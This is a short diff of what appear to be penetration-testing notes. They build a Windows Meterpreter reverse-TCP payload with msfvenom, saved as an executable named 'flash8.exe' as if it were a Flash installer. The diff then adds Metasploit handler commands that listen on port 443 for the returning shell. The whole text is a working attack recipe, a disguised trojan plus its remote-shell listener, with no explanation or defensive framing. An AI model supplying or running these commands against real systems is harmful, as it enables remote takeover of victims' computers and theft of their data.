@@ -2,5 +2,11 @@
 > msfvenom
 > msfvenom -l payloads
 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI DEVICE IPADDRESS>
-LPORT=443 -f exe > flash8.exe
-> 
+  LPORT=443 -f exe > flash8.exe
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> show options
+> set LHOST <kali IPADDRESS> 
+> set LPORT 443
+> exploit
